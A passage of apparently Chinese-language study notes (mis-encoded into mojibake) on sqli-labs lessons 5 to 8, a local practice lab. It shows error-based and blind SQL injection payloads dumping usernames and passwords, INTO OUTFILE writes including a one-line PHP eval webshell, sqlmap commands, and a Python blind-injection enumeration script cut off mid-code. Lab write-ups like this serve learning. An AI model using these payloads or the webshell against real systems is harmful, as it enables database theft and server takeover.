class="hljs-strong">***</span><br><br>ç„¶åå°±æ˜¯èµ°æ³¨å…¥æµç¨‹  <br><br>çˆ†è¡¨å<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),0x7e),1)â€“+</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&gt;XPATH syntax <span class="hljs-type">error</span>: <span class="hljs-string">&#x27;~emails,referers,uagents,users~&#x27;</span>  <br><br>çˆ†å­—æ®µ<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;â€™usersâ€™),0x7e),1)â€“+</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&gt;XPATH syntax <span class="hljs-keyword">error</span>: &#x27;~<span class="hljs-built_in">id</span>,username,password~&#x27;<br><br>çˆ†è¡¨<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+">http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+</a></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">&gt;<span class="hljs-keyword">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>DumbDumb,<span class="hljs-number">2</span>AngelinaI-kill-you,<span class="hljs-number">3</span>&#x27;  <br><br>å‘ç°å›æ˜¾ä¸å®Œå…¨ï¼Œå¬è¯´<span class="hljs-keyword">xpath</span>æŠ¥é”™æœ‰é•¿åº¦é™åˆ¶ï¼Œæ”¹ä¸ºï¼š<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™and updatexml(1,concat(0x7e,(select group_concat(id,username,password)from users limit 0,1),0x7e),1)â€“+</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">å‘ç°<span class="hljs-built_in">limit</span>çš„å€¼æ”¹å˜äº†ä¾ç„¶æ²¡ç»“æœï¼Œçœ‹äº†çœ¼csdnï¼Œå‘ç°group_concatè¦æ”¹ä¸º<span class="hljs-built_in">concat</span>ï¼Œ  <br>é—®äº†kimiï¼Œ<span class="hljs-built_in">limit</span>æ˜¯é™åˆ¶è¾“å‡ºçš„è¡Œåœ¨å“ªï¼Œå¦‚(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)å°±ä¼šé™åˆ¶ä¸ºä»ç¬¬ä¸€è¡Œå¼€å§‹æå–ä¸€åˆ—ï¼Œä½†æ˜¯ç”¨group_concatï¼Œä¼šå°†ä¸€æ•´ä¸ªè¡¨æ•´åˆä¸ºä¸€è¡Œï¼Œé™åˆ¶å°±æ²¡ç”¨äº†ã€‚<br><br>æœ€åpayloadæ”¹ä¸º<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1)â€“+</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>æˆåŠŸï¼Œåªè¦ä¸€æ¡æ¡çˆ†å‡º<span class="hljs-built_in">users</span>è¡¨ä¸­å†…å®¹å°±è¡Œäº†ã€‚<br><br></code></pre></td></tr></table></figure>
<h1 id="sql-labs-less6"><a href="#sql-labs-less6" class="headerlink" title="sql-labs less6"></a>sql-labs less6</h1><p>å’Œless5åŸç†ä¸€æ ·</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$get_id</span>&quot;</span><br></code></pre></td></tr></table></figure>
<p>é—­åˆpayloadæ”¹ä¸º</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;<br></code></pre></td></tr></table></figure>
<p>å³å¯</p>
<hr>
<h2 id="title-note-04date-2025-03-02-16-20-58tags-sql-labs"><a href="#title-note-04date-2025-03-02-16-20-58tags-sql-labs" class="headerlink" title="title: note-04date: 2025-03-02 16:20:58tags: sql-labs"></a>title: note-04<br>date: 2025-03-02 16:20:58<br>tags: sql-labs</h2><h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>éœ€è¦å…ˆè®¾ç½®mysqlçš„æ–‡ä»¶è¯»å†™æƒé™ï¼š  </p>
<blockquote>
<p>Windowsçš„é…ç½®æ–‡ä»¶åœ¨mysqlä¸‹çš„my.ini<br>Linuxçš„é…ç½®æ–‡ä»¶åœ¨&#x2F;etc&#x2F;conf  </p>
</blockquote>
<p>æ€ä¹ˆæ‰¾ä¹Ÿæ‰¾ä¸åˆ°ï¼Œæœ€åé—®äº†å¡å¯†ï¼Œåœ¨&#x2F;etc&#x2F;mysqlä¸­æ‰¾åˆ°äº†ï¼›<br>ä½†æ˜¯è¿˜æ˜¯æ²¡æ³•å†™é©¬ï¼›<br>dockerç¯å¢ƒç°åœ¨è¿˜æ²¡ææ‡‚ï¼Œä»¥åæœ‰æœºä¼šå†åœ¨å…¶å®ƒç¯å¢ƒä¸‹å†éƒ¨ç½²sql-labsè¯•è¯•ï¼›</p>
<h2 id="çœ‹ç½‘ä¸Šçš„è§£æ³•å†™ç‚¹ç¬”è®°ï¼š"><a href="#çœ‹ç½‘ä¸Šçš„è§£æ³•å†™ç‚¹ç¬”è®°ï¼š" class="headerlink" title="çœ‹ç½‘ä¸Šçš„è§£æ³•å†™ç‚¹ç¬”è®°ï¼š"></a>çœ‹ç½‘ä¸Šçš„è§£æ³•å†™ç‚¹ç¬”è®°ï¼š</h2><p>å…ˆåˆ¤æ–­æ³¨å…¥ç±»å‹ï¼Œæ²¡æœ‰sqlé”™è¯¯å›æ˜¾çš„æƒ…å†µå°±ä¸æ–­çŒœæµ‹é—­åˆè¯­å¥ï¼Œèƒ½æ­£ç¡®é—­åˆä¸æŠ¥é”™å°±è¡¨ç¤ºé—­åˆæˆåŠŸ  </p>
<p>å› ä¸ºç”¨ â€˜ æ‰“ç ´â€™â€™é—­åˆä½†æ˜¯æ²¡ç”¨çŒœå¯¹å…¨éƒ¨é—­åˆçš„è¯ä¼šä¸€ç›´æç¤ºsqlè¯­æ³•é”™è¯¯ï¼Œèƒ½å®Œæˆé—­åˆå¹¶ä¸”å¹¶ä¸”ä¸æŠ¥é”™å°±ä¸ºå®Œå…¨çŒœå¯¹ã€‚</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åç”¨è”åˆæŸ¥è¯¢<br>selectæ­é…into outfileèƒ½å†™å…¥æ•°æ®<br>å¤§æ¦‚æ˜¯selectèƒ½æŸ¥è¯¢æ•°æ®ï¼Œinto outfileèƒ½å†™å…¥æ•°æ®<br>union select 1,user(),database() into outfile â€œè·¯å¾„â€<br>èƒ½å†™å…¥ï¼š<br>1ï¼Œå½“å‰ç”¨æˆ·ï¼Œæ•°æ®åº“åç§°</p>
<blockquote>
<p>url ä¸­åæ–œæ \ä¼šè¢«å½“ä½œè½¬ä¹‰å­—ç¬¦å¤„ç†æ‰€ä»¥è¦ç”¨ä¸¤ä¸ªåæ–œæ æ¥ä¼ å…¥</p>
</blockquote>
<p>å†™é©¬</p>
<blockquote>
<p>?id&#x3D;1â€™)) union select 1,2,â€™<?php @eval($_POST["mima"])?>â€˜ into outfile â€œC:\phpStudy\WWW\sqli\Less-7\test.phpâ€ â€“ #  </p>
</blockquote>
<p>è¿™é‡Œçš„è·¯å¾„ä¸æ˜¯æˆ‘çš„ç¯å¢ƒ<br>ç°åœ¨æ‰çŸ¥é“åŸæ¥$_GETå’ŒPOSTå¿…é¡»å¤§å†™â€¦..<br>æœ€åè¿é©¬å°±è¡Œ</p>
<h2 id="å¦ä¸€ç§è§£æ³•ï¼Œç”¨å†™æ–‡ä»¶çš„æƒé™åœ¨æœåŠ¡çš„less7é¢˜ç›®ç›®å½•å†™txtè®¿é—®çˆ†åº“ç»“æœ"><a href="#å¦ä¸€ç§è§£æ³•ï¼Œç”¨å†™æ–‡ä»¶çš„æƒé™åœ¨æœåŠ¡çš„less7é¢˜ç›®ç›®å½•å†™txtè®¿é—®çˆ†åº“ç»“æœ" class="headerlink" title="å¦ä¸€ç§è§£æ³•ï¼Œç”¨å†™æ–‡ä»¶çš„æƒé™åœ¨æœåŠ¡çš„less7é¢˜ç›®ç›®å½•å†™txtè®¿é—®çˆ†åº“ç»“æœ"></a>å¦ä¸€ç§è§£æ³•ï¼Œç”¨å†™æ–‡ä»¶çš„æƒé™åœ¨æœåŠ¡çš„less7é¢˜ç›®ç›®å½•å†™txtè®¿é—®çˆ†åº“ç»“æœ</h2><blockquote>
<p>åœ¨sqlä¸­èƒ½ç”¨â€˜@@datadirâ€™ è¿”å›æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ï¼ŒéšåçŒœæµ‹ç½‘ç«™çš„ç»å¯¹è·¯å¾„  </p>
</blockquote>
<p>å°†æŸ¥è¯¢åˆ°çš„å½“å‰ç”¨æˆ·å’Œæ•°æ®åº“åç§°å†™å…¥åˆ°é¢˜ç›®ç›®å½•ä¸‹çš„1.txtéšåè®¿é—®å°±èƒ½çœ‹åˆ°æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>(), <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;é¢˜ç›®ç›®å½•\\1.txt&quot;</span> --+<br></code></pre></td></tr></table></figure>
<p>ç„¶åå°±æ˜¯æ ‡å‡†æ“ä½œ</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;é¢˜ç›®ç›®å½•\\2.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>æˆ‘æƒ³ï¼Œå› ä¸ºä¸ç”¨æ‹…å¿ƒå›æ˜¾ç•Œé¢é—®é¢˜æ‰€ä»¥ä¹Ÿå¯ä»¥ä¸ç”¨group_concat,unionç­‰ï¼Œå‰é¢ä¸¤ä¸ªçš„æŸ¥è¯¢ä¹Ÿæ˜¯ä¸€æ ·</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;é¢˜ç›®ç›®å½•\\3.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=&#x27;users&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;é¢˜ç›®ç›®å½•\\4.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>å…¶å®æˆ‘çœ‹æ²¡æœ‰äº†å›æ˜¾é¡µé¢çš„é™åˆ¶ï¼Œä¸ç”¨çˆ†å­—æ®µä¹Ÿè¡Œï¼Œç›´æ¥çˆ†è¡¨å°±å¾—ï¼š</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;é¢˜ç›®ç›®å½•\\5.txt&quot;</span> <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡Œå†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨æ•°æ®åº“fileæƒé™å‘æ“ä½œç³»ç»Ÿå†™å…¥æ–‡ä»¶æ—¶ï¼Œå¯¹äºç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ä¸èƒ½è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœç¬¬ä¸€æ¬¡ä¸Šä¼ 1.txtï¼Œä¸‹æ¬¡å†ä¸Šä¼ 1.txtï¼Œå°±æ˜¯æ— æ•ˆå‘½ä»¤äº†ï¼Œä¹Ÿå°±æ˜¯æ–°çš„1.txtä¸­çš„å†…å®¹å¹¶ä¸ä¼šè¦†ç›–ä¹‹å‰çš„1.txt</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46315342/article/details/106557552">https://blog.csdn.net/m0_46315342/article/details/106557552</a></p>
<hr>
<h2 id="title-note-05date-2025-03-04-21-17-54tags-sql-labs"><a href="#title-note-05date-2025-03-04-21-17-54tags-sql-labs" class="headerlink" title="title: note-05date: 2025-03-04 21:17:54tags: sql-labs"></a>title: note-05<br>date: 2025-03-04 21:17:54<br>tags: sql-labs</h2><h1 id="ä¿®æ­£sql-labs-less7é”™è¯¯"><a href="#ä¿®æ­£sql-labs-less7é”™è¯¯" class="headerlink" title="ä¿®æ­£sql-labs-less7é”™è¯¯"></a>ä¿®æ­£sql-labs-less7é”™è¯¯</h1><p>å®ç°äº†winä¸‹phpstudyéƒ¨ç½²sqliï¼Œè‡ªå·±åšäº†ä¸€éless7ï¼Œå‘ç°äº†selectå’Œunion selectçš„é—®é¢˜ï¼Œ<br>ä¸Šæ¬¡æˆ‘ä»¥ä¸ºæœ‰äº†æ–‡ä»¶å†™å…¥åä¸éœ€è¦unionäº†ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯è¿™æ ·ï¼Œæ²¡äº†unionä¼šå¤±è´¥<br>é—®äº†kimi  </p>
<blockquote>
<p>ä¸ºä»€ä¹ˆ<br>?id&#x3D;-1â€™)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;â€™securityâ€™ into outfileâ€D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txtâ€â€“+<br>è€Œ<br>?id&#x3D;-1â€™)) select table_name from information_schema.tables where table_schema&#x3D;â€™securityâ€™ into outfileâ€D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txtâ€â€“+<br>ä¸ç”Ÿæ•ˆ  </p>
</blockquote>
<p>KIMI:</p>
<blockquote>
<p><em><strong>ä¸ºä»€ä¹ˆUNION SELECTæ˜¯å…³é”®ï¼Ÿ</strong></em><br>UNION SELECTçš„ä½œç”¨æ˜¯æŠŠä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœåˆå¹¶åœ¨ä¸€èµ·ï¼Œè€Œä¸æ˜¯ç›´æ¥æ›¿æ¢åŸå§‹æŸ¥è¯¢ã€‚å®ƒè¦æ±‚ä¸¤ä¸ªæŸ¥è¯¢çš„åˆ—æ•°å’Œæ•°æ®ç±»å‹åŒ¹é…ï¼Œä½†åªè¦æ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œå°±èƒ½è®©æ³¨å…¥çš„è¯­å¥ä¸åŸå§‹æŸ¥è¯¢å…¼å®¹ã€‚è€Œç›´æ¥çš„SELECTè¯­å¥æ²¡æœ‰è¿™ç§å…¼å®¹æ€§ï¼Œç›´æ¥ç ´åäº†åŸå§‹æŸ¥è¯¢çš„ç»“æ„ï¼Œå¯¼è‡´è¯­æ³•é”™è¯¯ã€‚<br><em><strong>æ•°æ®åº“çš„æ‰§è¡Œé€»è¾‘å†³å®šäº†è¿™ä¸€åˆ‡</strong></em><br>æ•°æ®åº“åœ¨è§£æSQLè¯­å¥æ—¶ï¼Œä¼šä¸¥æ ¼æŒ‰ç…§è¯­æ³•è§„åˆ™æ‰§è¡Œã€‚å¦‚æœæ³¨å…¥çš„è¯­å¥ç ´åäº†åŸå§‹æŸ¥è¯¢çš„ç»“æ„ï¼Œæ•°æ®åº“ä¼šæŠ¥é”™ã€‚è¿™ç§æŠ¥é”™å¯èƒ½ä¸ä¼šç›´æ¥æ˜¾ç¤ºç»™ç”¨æˆ·ï¼Œä½†ä¼šå¯¼è‡´æ³¨å…¥å¤±è´¥ã€‚ç¬¬ä¸€ä¸ªè¯­å¥é€šè¿‡UNION SELECTä¸åŸå§‹æŸ¥è¯¢å…¼å®¹ï¼Œæ‰€ä»¥èƒ½æˆåŠŸï¼›ç¬¬äºŒä¸ªè¯­å¥ç›´æ¥ç ´åäº†åŸå§‹æŸ¥è¯¢çš„è¯­æ³•ï¼Œæ‰€ä»¥å¤±è´¥ã€‚<br><em><strong>æƒé™å’Œè·¯å¾„ä¸æ˜¯é—®é¢˜</strong></em><br>INTO OUTFILEæ“ä½œéœ€è¦æ•°æ®åº“æˆ·å…·æœ‰FILEæƒé™ï¼Œè€Œä¸”ç›®æ ‡è·¯å¾„å¿…é¡»æœ‰æ•ˆã€‚ä½†æ—¢ç„¶ç¬¬ä¸€ä¸ªè¯­å¥å·²ç»æˆåŠŸï¼Œè¯´æ˜æƒé™å’Œè·¯å¾„éƒ½æ²¡æœ‰é—®é¢˜ã€‚ç¬¬äºŒä¸ªè¯­å¥å¤±è´¥çš„åŸå› å®Œå…¨åœ¨äºè¯­æ³•é”™è¯¯ï¼Œè€Œä¸æ˜¯æƒé™æˆ–è·¯å¾„ã€‚  </p>
</blockquote>
<p>åŸæ¥è”åˆæ³¨å…¥æ¼æ´å«<em><strong>è”åˆ</strong></em>æ˜¯è¿™ä¸ªåŸç†</p>
<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>è¯¥é¢˜æµ‹è¯•æ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼Œåªæœ‰ç™»å½•æ˜¯å¦æˆåŠŸå›æ˜¾<br>åªèƒ½ç”¨ç›²æ³¨äº†ï¼Œ<br>sqlmapæˆ–ä¸Šæ¬¡less5çš„è„šæœ¬éƒ½è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --batch --dbs<br><br>--batchè¡¨ç¤ºç¢°åˆ°é€‰æ‹©æ—¶é€‰ç”¨é»˜è®¤é€‰é¡¹ï¼Œ--dbsè¡¨ç¤ºçˆ¬å–æ‰€æœ‰æ•°æ®åº“å<br>-D  åº“å --tablesè¡¨ç¤ºçˆ¬å–æŸæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨<br>-D åº“å -T è¡¨å--columnsè¡¨ç¤ºçˆ¬å–æŸåº“ä¸‹æŸè¡¨çš„æ‰€æœ‰åˆ—<br></code></pre></td></tr></table></figure>

<p>less5è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-8/&quot;</span> <br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span> <br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span> <br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] é•¿åº¦ä¸º: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è·å–ç¬¬ <span class="hljs-subst">&#123;i&#125;</span> ä¸ªå­—ç¬¦...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å½“å‰ç»“æœ: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] æ•°æ®åº“å: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è¡¨æ•°é‡: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è¡¨å: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    target_table = <span class="hljs-string">&quot;users&quot;</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è·å–<span class="hljs-subst">&#123;target_table&#125;</span>è¡¨çš„å­—æ®µ...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å­—æ®µæ•°é‡: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å­—æ®µå: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è·å–<span 